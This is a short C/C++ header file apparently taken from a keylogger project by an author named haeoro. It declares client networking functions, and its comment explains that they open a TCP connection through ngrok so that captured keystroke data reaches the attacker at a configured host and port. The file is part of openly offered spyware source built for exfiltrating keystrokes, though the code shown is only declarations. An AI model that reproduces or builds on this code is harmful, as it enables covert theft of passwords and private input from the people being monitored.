/*-------------------------------------------------------------------

*   ``~ Header file for client network code (Written by haeoro) ~``
*
*   NOTE: In the ks2server definition file, global variables: HOST, PORT are only to be
*   defined with true values IF the attacker needs data sent back remotely.
*   Ensure HOST = nullptr, and PORT = 0 if no networking functionality
*   is required.
*
*   initClient() creates a TCP connection over the internet with the help of ngrok to share
*   keystroke data remotely.
*
*   isHostInDotForm() checks if the HOST const in ks2server.cpp is in IPv4 format.

-------------------------------------------------------------------*/

#pragma once
#include <winsock2.h>

int isHostInDotForm();
SOCKET initClient();
